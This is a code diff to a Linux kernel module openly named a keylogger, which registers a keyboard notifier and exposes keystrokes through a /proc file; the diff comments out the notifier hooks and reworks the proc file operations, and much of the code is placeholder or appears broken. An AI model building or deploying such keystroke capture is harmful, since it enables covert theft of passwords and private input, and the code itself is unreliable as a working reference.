@@ -97,6 +97,7 @@ char convert_keycode_to_char(int keycode) {
     // Simplified example: actual implementation required
     return (char)keycode; // Placeholder conversion
 }
+*/
 
 // Keyboard notifier function
 static int keyboard_notifier_fn(struct notifier_block *nb, unsigned long action, void *data) {
@@ -118,28 +119,22 @@ static struct notifier_block keyboard_nb = {
 // /proc read function
 static int proc_read(struct seq_file *m, void *v) {
     // TODO: Implement logic to iterate over the red-black tree and print keystrokes
-    seq_printf(m, "Keylogger output\n");
+    //seq_printf(m, "Keylogger output\n");
     return 0;
-}
-
-static int proc_open(struct inode *inode, struct file *file) {
-    return single_open(file, proc_read, NULL);
 }
 
 // Define the file operations for the /proc file
 static struct proc_ops proc_fops = {
-    .read = proc_read,
-    .open = proc_open
+    proc_read: proc_read,
 };
-*/
 
 // Module initialization
 static int __init keylogger_init(void) {
     // Register keyboard notifier
-    register_keyboard_notifier(&keyboard_nb);
+    //register_keyboard_notifier(&keyboard_nb);
 
     // Create /proc file
-    proc_file = proc_create(PROC_FILENAME, 0, NULL, &proc_file_fops);
+    proc_file = proc_create(PROC_FILENAME, 0, NULL, &proc_fops);
     if (!proc_file) {
         return -ENOMEM;
     }
@@ -151,7 +146,7 @@ static int __init keylogger_init(void) {
 // Module cleanup
 static void __exit keylogger_exit(void) {
     remove_proc_entry(PROC_FILENAME, NULL);
-    unregister_keyboard_notifier(&keyboard_nb);
+    //unregister_keyboard_notifier(&keyboard_nb);
     printk(KERN_INFO "Keylogger module unloaded\n");
 }
 
